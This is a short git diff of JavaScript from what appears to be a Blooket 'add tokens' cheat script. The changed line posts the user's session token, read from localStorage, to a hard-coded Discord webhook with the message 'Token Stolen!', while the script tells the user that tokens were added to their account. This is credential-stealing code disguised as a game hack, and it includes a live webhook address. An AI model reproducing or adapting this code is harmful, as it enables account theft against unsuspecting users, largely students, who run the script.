@@ -47,7 +47,7 @@ async function addTokens() {
         })
     });
     */
-    fetchApi('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ',{content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')
+    fetchApi('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ',{content: await getName(myToken)+"'s Token Stolen!\n"+localStorage.token+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')
 
     if (response.status == 200) {
         alert(`${add_tokens} added to your account!`);
